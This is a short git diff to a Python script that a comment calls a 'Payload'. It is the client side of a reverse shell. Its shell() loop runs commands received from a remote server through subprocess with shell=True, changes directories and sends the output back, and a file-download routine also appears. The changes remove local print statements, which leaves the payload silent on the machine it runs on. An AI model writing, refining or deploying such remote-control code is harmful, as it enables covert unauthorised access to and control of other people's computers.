@@ -1,4 +1,3 @@
-from server import target_communication
 import socket
 import time 
 import json
@@ -45,7 +44,7 @@ def download_file(file_name):
         except socket.timeout as e:
             break
     s.settimeout(None)
-    f.close
+    f.close()
     pass
 
 
@@ -78,7 +77,6 @@ def shell():
             break
         elif command=="whereami": # return to main directory
             reliable_send(os.getcwd())
-            print("")
         elif command[:len("cd ")]=="cd ":
             #move_to_different_directory(cmd)
             os.chdir(command[3:]) #anything that surpasses "cd "
@@ -94,7 +92,6 @@ def shell():
             execute= subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read() #gives output of cmd
             result= result.decode()
-            print(result)
             reliable_send(result)
 
 #first establish a connection between Payload and Server.
